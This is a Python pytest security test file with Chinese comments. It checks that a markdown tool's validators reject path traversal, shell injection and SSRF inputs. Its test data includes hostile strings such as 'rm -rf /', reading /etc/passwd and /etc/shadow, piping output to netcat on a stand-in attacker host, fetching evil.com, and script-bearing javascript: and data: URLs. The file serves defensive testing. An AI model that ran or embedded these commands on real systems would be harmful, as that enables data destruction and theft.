#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""安全测试：命令注入和路径遍历防护"""

import os
import sys
import pytest
import tempfile
import shutil

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.readmd_modules.validators import ValidationError


class TestPathTraversalPrevention:
    """测试路径遍历攻击防护"""
    
    def test_basic_path_traversal_blocked(self):
        """测试基本路径遍历被阻止"""
        from src.readmd_modules.validators import validate_file_path
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "test/../../../etc/passwd",
        ]
        
        for path in malicious_paths:
            with pytest.raises(ValidationError, match="非法路径"):
                validate_file_path(path)
    
    def test_absolute_path_outside_allowed_dirs(self):
        """测试绝对路径超出允许目录"""
        from src.readmd_modules.validators import validate_file_path
        
        # 假设允许的目录是当前测试目录
        allowed_dirs = [os.path.dirname(os.path.abspath(__file__))]
        
        # 尝试访问系统目录应该被阻止
        with pytest.raises(ValidationError):
            validate_file_path("/etc/passwd", allowed_dirs=allowed_dirs)
    
    def test_valid_path_accepted(self):
        """测试合法路径被接受"""
        from src.readmd_modules.validators import validate_file_path
        
        # 创建临时文件
        with tempfile.NamedTemporaryFile(suffix='.md', delete=False) as f:
            temp_path = f.name
        
        try:
            result = validate_file_path(temp_path)
            assert os.path.isabs(result)
            assert os.path.exists(result)
        finally:
            os.unlink(temp_path)
    
    def test_extension_validation(self):
        """测试文件扩展名验证"""
        from src.readmd_modules.validators import validate_file_path
        
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            temp_path = f.name
        
        try:
            # 只允许.md文件
            with pytest.raises(ValidationError, match="不支持的文件类型"):
                validate_file_path(temp_path, allowed_extensions=['.md'])
            
            # 允许.txt文件
            result = validate_file_path(temp_path, allowed_extensions=['.txt'])
            assert result is not None
        finally:
            os.unlink(temp_path)


class TestShellInjectionPrevention:
    """测试Shell注入攻击防护"""
    
    def test_shell_metacharacters_blocked(self):
        """测试Shell元字符被阻止"""
        from src.readmd_modules.validators import validate_command
        
        malicious_commands = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test`whoami`",
            "test$(cat /etc/passwd)",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValidationError, match="包含危险字符"):
                validate_command(cmd)
    
    def test_safe_command_accepted(self):
        """测试安全命令被接受"""
        from src.readmd_modules.validators import validate_command
        import sys
        
        # 根据平台选择可用的命令
        if sys.platform == 'win32':
            safe_commands = [
                ['explorer', '/path/to/dir'],
            ]
        elif sys.platform == 'darwin':
            safe_commands = [
                ['open', '/path/to/file'],
            ]
        else:  # Linux
            safe_commands = [
                ['xdg-open', '/path/to/file'],
            ]
        
        for cmd in safe_commands:
            result = validate_command(cmd)
            assert result is not None
    
    def test_command_not_in_whitelist_blocked(self):
        """测试不在白名单的命令被阻止"""
        from src.readmd_modules.validators import validate_command
        
        with pytest.raises(ValidationError, match="不允许的命令"):
            validate_command(['rm', '-rf', '/'])
        
        with pytest.raises(ValidationError, match="不允许的命令"):
            validate_command(['curl', 'http://evil.com'])


class TestURLValidation:
    """测试URL验证和SSRF防护"""
    
    def test_invalid_protocol_blocked(self):
        """测试无效协议被阻止"""
        from src.readmd_modules.validators import validate_url
        
        invalid_urls = [
            "ftp://example.com/file",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValidationError, match="只支持HTTP/HTTPS协议"):
                validate_url(url)
    
    def test_internal_ip_blocked(self):
        """测试内网IP被阻止（SSRF防护）"""
        from src.readmd_modules.validators import validate_url
        
        internal_urls = [
            "http://127.0.0.1/admin",
            "http://192.168.1.1/config",
            "http://10.0.0.1/internal",
            "http://172.16.0.1/private",
        ]
        
        for url in internal_urls:
            with pytest.raises(ValidationError, match="不允许访问内网或保留地址"):
                validate_url(url)
    
    def test_valid_url_accepted(self):
        """测试合法URL被接受"""
        from src.readmd_modules.validators import validate_url
        
        valid_urls = [
            "https://example.com/page",
            "http://example.org/article",
        ]
        
        for url in valid_urls:
            result = validate_url(url)
            assert result == url


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
